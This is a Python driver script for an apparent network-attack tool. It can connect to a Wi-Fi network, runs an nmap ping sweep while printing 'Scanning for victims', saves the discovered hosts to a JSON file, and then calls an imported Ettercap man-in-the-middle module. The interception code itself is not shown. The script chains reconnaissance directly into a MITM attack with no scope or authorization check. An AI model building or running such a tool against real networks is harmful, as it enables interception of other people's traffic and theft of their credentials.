import argparse
import json
import sys
import time
import threading
import net_connect
import mitm_ettercap 


_stop_dots = threading.Event()


def show_progress_dots(message: str = "[*] Scanning for victims"):
    while not _stop_dots.is_set():
        for i in range(3):
            if _stop_dots.is_set():
                break
            dots = "." * (i + 1)
            sys.stdout.write(f"\r {message}{dots.ljust(4)}")
            sys.stdout.flush()
            time.sleep(0.3)


def main():
    parser = argparse.ArgumentParser(description="Connect to Wi-Fi (optional) and run an nmap ping-sweep on the active network.")
    parser.add_argument("--ssid", help="SSID to connect to (optional)")
    parser.add_argument("--password", help="Wi-Fi password (optional)")
    parser.add_argument("--no-connect", action="store_true", help="Do not attempt to connect; just use the currently active interface")
    parser.add_argument("--outprefix", default="nmap_ping", help="Prefix for saved nmap output files (if used)")
    args = parser.parse_args()

    _stop_dots.clear()
    dots_thread = threading.Thread(target=show_progress_dots, daemon=True)
    dots_thread.start()
            
    try:
        ssid = None if args.no_connect else args.ssid
        result = net_connect.connect_and_scan(ssid, args.password, args.outprefix)
    except net_connect.NetConnectError as e:
        print(f"ERROR: {e}", file=sys.stderr)
        sys.exit(2)
    finally:
        _stop_dots.set()
        dots_thread.join(timeout=1)
        print("\r [*] Scan complete!      ")
 
    summary = {
        "Interface used": result['iface'],
        "Your IP": result['src_ip'],
        "Network": result['cidr'],
        "Hosts_up_count": len([h for h in result['scan_parsed'] if h['status'].lower()=='up'])
    }
    print("\nScan summary:")
    print(json.dumps(summary, indent=2))
 
    fname = f"scan_result.json"
    with open(fname, 'w', encoding='utf-8') as f:
        json.dump(result, f, indent=2)
 
 
if __name__ == '__main__':
    main()
    mitm_ettercap.main()  
    
